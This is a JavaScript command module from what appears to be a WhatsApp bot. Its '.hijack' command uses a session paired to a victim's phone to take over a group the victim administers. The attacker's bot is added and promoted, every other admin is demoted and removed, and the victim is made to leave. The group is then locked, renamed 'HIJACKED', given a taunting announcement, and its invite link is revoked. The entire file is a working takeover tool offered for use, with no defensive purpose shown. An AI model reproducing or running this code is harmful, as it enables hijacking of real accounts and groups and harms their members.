// language: JavaScript, file: commands/hijack/hijack.js
'use strict';
const { bootHijackSession }                     = require('../../lib/hijackSession');
const { extractPhone, rankOf, resolveJid,
        checkAccountStatus }                    = require('../../lib/hijackHelper');

const NEW_SUBJECT = '𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 ʙʏ 𝙼𝙰𝙳𝙰𝚁𝙰 𝚇-𝙼𝙳';

const FULL_ANNOUNCEMENT =
`╭═══〘 ⚠️ 𝐀𝐋𝐄𝐑𝐓 〙═══⊷❍
┃ 
┃  𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍
┃  𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 𝐁𝐘
┃  𝙼𝙰𝙳𝙰𝚁𝙰 𝚇-𝙼𝙳 | 𝙸𝙽𝙲.
┃ 
┃  ⛩️ *𝙏𝙃𝙀 𝙀𝙔𝙀 𝙊𝙋𝙀𝙉𝙎*
┃  ⛩️ *𝙏𝙃𝙀 𝙂𝙃𝙊𝙎𝙏 𝙊𝙁 𝙏𝙃𝙀 𝙐𝘾𝙃𝙄𝙃𝘼*
┃ 
┃  _"Wake up to reality! Nothing ever_
┃  _goes as planned in this accursed world."_
┃ 
┃  👁️‍🗨️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴀᴅᴀʀᴀ x-ᴍᴅ
╰══════════════════════════`;

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log) {
    for (let i = 0; i < 15; i++) {
        try {
            const meta = await attackerSock.groupMetadata(groupJid);
            const me = meta.participants.find(p => extractPhone(p.id) === extractPhone(attackerJid) || extractPhone(p.lid) === extractPhone(attackerJid));
            if (me && rankOf(me) === 2) return true;
        } catch (e) { log?.(`[hijack:promote poll ${i}] ${e.message}`); }
        await sleep(1000);
    }
    return false;
}

async function lockAndRename(attackerSock, groupJid, log) {
    let locked = false, renamed = false, announced = false;

    try { await attackerSock.groupMetadata(groupJid); } catch {}
    await sleep(3000);

    for (let i = 0; i < 3 && !locked; i++) {
        try { await attackerSock.groupSettingUpdate(groupJid, 'announcement'); locked = true; }
        catch (e) { log?.(`[hijack:lock try ${i}] ${e.message}`); await sleep(3000); }
    }
    for (let i = 0; i < 3 && !renamed; i++) {
        try { await attackerSock.groupUpdateSubject(groupJid, NEW_SUBJECT); renamed = true; }
        catch (e) { log?.(`[hijack:rename try ${i}] ${e.message}`); await sleep(3000); }
    }
    for (let i = 0; i < 3 && !announced; i++) {
        try { await attackerSock.sendMessage(groupJid, { text: FULL_ANNOUNCEMENT }); announced = true; }
        catch (e) { log?.(`[hijack:announce try ${i}] ${e.message}`); await sleep(3000); }
    }

    return { locked, renamed, announced };
}

async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock, opts = {}) {
    const { log, onPhase } = opts;
    const result = {
        groupJid, attackerJid,
        contested: false, contestedSafe: false,
        added: false, promoted: false, demoted: 0, removed: 0,
        left: false, promotedToSuper: false,
        locked: false, renamed: false, announced: false, revoked: false,
        aborted: false, reason: null,
    };

    // 1 — Resolve Target
    onPhase?.('ʀᴇsᴏʟᴠᴇ ᴛᴀʀɢᴇᴛ');
    const meta = await targetSock.groupMetadata(groupJid).catch((e) => { throw new Error(`meta: ${e.message}`); });
    const targetPhone = extractPhone(targetSock.user?.id);
    const targetLid   = extractPhone(targetSock.user?.lid);

    const targetPart = meta.participants.find(p => {
        const pId = extractPhone(p.id), pLid = extractPhone(p.lid), pPhone = extractPhone(p.phoneNumber);
        if (pId === targetPhone || pLid === targetPhone || pPhone === targetPhone) return true;
        if (targetLid && (pId === targetLid || pLid === targetLid || pPhone === targetLid)) return true;
        if (p.id === targetSock.user?.id) return true;
        if (targetSock.user?.lid && p.lid === targetSock.user.lid) return true;
        return false;
    });

    if (!targetPart) { result.aborted = true; result.reason = 'target not in group'; return result; }
    
    // FIX: Accept regular admins (1) as well as superadmins (2)
    if (rankOf(targetPart) < 1) { 
        result.aborted = true; 
        result.reason = 'target is not an admin'; 
        return result; 
    }

    // 2 — Scan Contests
    onPhase?.('sᴄᴀɴ sᴜᴘᴇʀᴀᴅᴍɪɴs');
    const otherSupers = meta.participants.filter(p => p !== targetPart && rankOf(p) === 2);
    if (otherSupers.length) {
        result.contested = true;
        let anyAlive = false;
        for (const os of otherSupers) {
            const resolved = await resolveJid(targetSock, groupJid, os.id);
            const st = await checkAccountStatus(targetSock, resolved);
            if (st.status === 'alive' || st.status === 'unknown') anyAlive = true;
        }
        if (anyAlive) { result.aborted = true; result.reason = 'contested — live superadmin'; return result; }
        result.contestedSafe = true;
    }

    // 3 — Get Attacker In
    onPhase?.('ᴀᴅᴅ ᴀᴛᴛᴀᴄᴋᴇʀ');
    const present = meta.participants.some(p => extractPhone(p.id) === extractPhone(attackerJid));
    let addedSuccess = present;

    if (!present) {
        try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'add'); addedSuccess = true; }
        catch (e) { log?.(`[hijack:add] ${e.message}`); }

        if (!addedSuccess) {
            onPhase?.('ᴀᴜᴛᴏ-ᴊᴏɪɴ');
            try {
                await targetSock.groupSettingUpdate(groupJid, 'not_announcement').catch(() => {});
                await targetSock.groupMemberAddMode(groupJid, 'all_member_add').catch(() => {});
                const inviteCode = await targetSock.groupInviteCode(groupJid);
                if (inviteCode) { await attackerSock.groupAcceptInvite(inviteCode); addedSuccess = true; }
            } catch (e) { log?.(`[hijack:autojoin] ${e.message}`); }
        }
    }

    if (!addedSuccess) { result.aborted = true; result.reason = 'failed to add attacker'; return result; }
    result.added = true;
    await sleep(3000);

    // 4 — PROMOTE ATTACKER
    onPhase?.('ᴘʀᴏᴍᴏᴛᴇ ᴀᴛᴛᴀᴄᴋᴇʀ');
    try { 
        await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'promote'); 
        result.promoted = true; 
    } catch (e) { log?.(`[hijack:promote] ${e.message}`); }
    
    await sleep(3000);
    result.promotedToSuper = await waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log);
    if (!result.promotedToSuper) { 
        result.aborted = true; 
        result.reason = 'attacker not promoted (socket issue)'; 
        return result; 
    }

    // 5 — JOINT DEMOTION
    onPhase?.('ᴅᴇᴍᴏᴛᴇ ᴀᴅᴍɪɴs');
    const otherAdmins = meta.participants.filter(p => p !== targetPart && rankOf(p) === 1).map(p => p.id);
    
    if (otherAdmins.length > 0) {
        const targetChunk = otherAdmins.slice(0, Math.ceil(otherAdmins.length * 0.7));
        const attackerChunk = otherAdmins.slice(Math.ceil(otherAdmins.length * 0.7));

        if (targetChunk.length > 0) {
            try { await targetSock.groupParticipantsUpdate(groupJid, targetChunk, 'demote'); result.demoted += targetChunk.length; } 
            catch (e) { log?.(`[demote:target] ${e.message}`); }
            await sleep(1500);
        }

        if (attackerChunk.length > 0) {
            try { await attackerSock.groupParticipantsUpdate(groupJid, attackerChunk, 'demote'); result.demoted += attackerChunk.length; } 
            catch (e) { log?.(`[demote:attacker] ${e.message}`); }
            await sleep(1500);
        }
    }

    // 6 — Remove them entirely
    onPhase?.('ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴs');
    for (const j of otherAdmins) {
        try { await attackerSock.groupParticipantsUpdate(groupJid, [j], 'remove'); result.removed++; }
        catch (e) { log?.(`[hijack:remove] ${e.message}`); }
        await sleep(1000);
    }

    // 7 — Target Leaves
    onPhase?.('ᴛᴀʀɢᴇᴛ ʟᴇᴀᴠᴇs');
    await sleep(3000); 
    try { await targetSock.groupLeave(groupJid); result.left = true; }
    catch (e) { log?.(`[hijack:leave] ${e.message}`); }

    // 8 — Lock, Rename, Announce
    onPhase?.('ʟᴏᴄᴋ + ʀᴇɴᴀᴍᴇ');
    const lr = await lockAndRename(attackerSock, groupJid, log);
    result.locked = lr.locked;
    result.renamed = lr.renamed;
    result.announced = lr.announced;

    // 9 — Revoke Link
    onPhase?.('ʀᴇᴠᴏᴋᴇ ɪɴᴠɪᴛᴇ');
    try {
        const code = await attackerSock.groupRevokeInvite(groupJid);
        result.revoked = !!code;
    } catch (e) { log?.(`[hijack:revoke] ${e.message}`); }

    return result;
}

module.exports = {
    name: 'hijack',
    aliases: ['hjack', 'takeover', 'seize'],
    category: 'hijack',
    desc: '👁️ ɢʀᴏᴜᴘ ᴛᴀᴋᴇᴏᴠᴇʀ ᴠɪᴀ ᴘᴀɪʀᴇᴅ sᴇssɪᴏɴ',
    usage: '.hijack <targetPhone> <groupLink or JID>',
    privateOnly: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        
        let targetPhone = null;
        let groupTarget = null;

        for (const arg of args) {
            if (arg.includes('chat.whatsapp.com') || arg.endsWith('@g.us')) {
                groupTarget = arg;
            } else if (/^\d{7,15}$/.test(arg.replace(/\D/g, ''))) {
                targetPhone = arg.replace(/\D/g, '');
            }
        }

        if (!targetPhone || !groupTarget) {
            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijack <ᴛᴀʀɢᴇᴛᴘʜᴏɴᴇ> <ɢᴄ ʟɪɴᴋ/ᴊɪᴅ>${s.FOOTER}`);
        }

        const scopeKey = ctx.sender;
        const attackerJid = sock.user?.id || ctx.sender;

        if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
        if (!attackerJid) return ctx.reply(`❌ ʙᴏᴛ sᴇssɪᴏɴ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);

        let groupJid = groupTarget;
        let progressMsg = null;

        const updateProgress = async (text) => {
            try {
                const content = `▸ ${text}${s.FOOTER}`;
                if (!progressMsg) {
                    progressMsg = await sock.sendMessage(ctx.from, { text: content }, { quoted: msg });
                } else {
                    await sock.sendMessage(ctx.from, { text: content, edit: progressMsg.key });
                }
            } catch {}
        };

        await updateProgress('ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ ʟɪɴᴋ...');
        
        if (groupJid.includes('chat.whatsapp.com')) {
            let code = groupJid.split('/').pop().split('?')[0].trim();
            try {
                const info = await sock.groupGetInviteInfo(code);
                if (info?.id) groupJid = info.id;
                else throw new Error('Info not returned');
            } catch (e) {
                await updateProgress(`❌ ɢʀᴏᴜᴘ ʟɪɴᴋ ғᴀɪʟ: ${e.message}`);
                return;
            }
        }

        await updateProgress(`ʙᴏᴏᴛɪɴɢ ʜɪᴊᴀᴄᴋ sᴇssɪᴏɴ ғᴏʀ +${targetPhone}...`);

        let targetSock = null;
        try { targetSock = await bootHijackSession(scopeKey, targetPhone); }
        catch (e) {
            await updateProgress(`❌ sᴇssɪᴏɴ ʙᴏᴏᴛ ғᴀɪʟ: ${e.message}`);
            return;
        }

        try {
            const result = await takeoverSequence(
                targetSock, groupJid, attackerJid, sock,
                {
                    log: (m) => console.error('[hijack]', m),
                    onPhase: updateProgress,
                }
            );

            const lines = [
                `╭═══〘 ʜɪᴊᴀᴄᴋ ʀᴇᴘᴏʀᴛ 〙═══⊷❍`,
                `┃ 🎯 ${groupJid}`,
                `┃ 👤 ᴛᴀʀɢᴇᴛ +${targetPhone}`,
                `┃ ⚔️ ᴀᴛᴛᴀᴄᴋᴇʀ ${extractPhone(attackerJid)}`,
                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄`,
                `┃ ${result.contested ? (result.contestedSafe ? '🟡 ᴄᴏɴᴛᴇsᴛᴇᴅ (sᴀғᴇ)' : '🔴 ᴄᴏɴᴛᴇsᴛᴇᴅ') : '🟢 ᴜɴᴄᴏɴᴛᴇsᴛᴇᴅ'}`,
                `┃ ${result.added ? '✅' : '❌'} ᴀᴅᴅᴇᴅ`,
                `┃ ${result.promotedToSuper ? '✅' : '❌'} sᴜᴘᴇʀᴀᴅᴍɪɴ`,
                `┃ 📉 ᴅᴇᴍᴏᴛᴇᴅ ${result.demoted}`,
                `┃ 🚫 ʀᴇᴍᴏᴠᴇᴅ ${result.removed}`,
                `┃ ${result.left ? '✅' : '❌'} ᴛᴀʀɢᴇᴛ ʟᴇғᴛ`,
                `┃ ${result.locked ? '✅' : '❌'} ʟᴏᴄᴋᴇᴅ`,
                `┃ ${result.renamed ? '✅' : '❌'} ʀᴇɴᴀᴍᴇᴅ`,
                `┃ ${result.announced ? '✅' : '❌'} ᴀɴɴᴏᴜɴᴄᴇᴅ`,
                `┃ ${result.revoked ? '✅' : '❌'} ɪɴᴠɪᴛᴇ ʀᴇᴠᴏᴋᴇᴅ`,
                `┃ ${result.aborted ? `⛔ ${result.reason}` : '🏁 ᴄᴏᴍᴘʟᴇᴛᴇ'}`,
                `╰══════════════════════════`,
            ];
            
            try {
                await sock.sendMessage(ctx.from, { text: lines.join('\n') + s.FOOTER, edit: progressMsg.key });
            } catch {
                await ctx.reply(lines.join('\n') + s.FOOTER);
            }

        } catch (e) {
            await updateProgress(`❌ ERROR: ${e.message}`);
        }
    }
};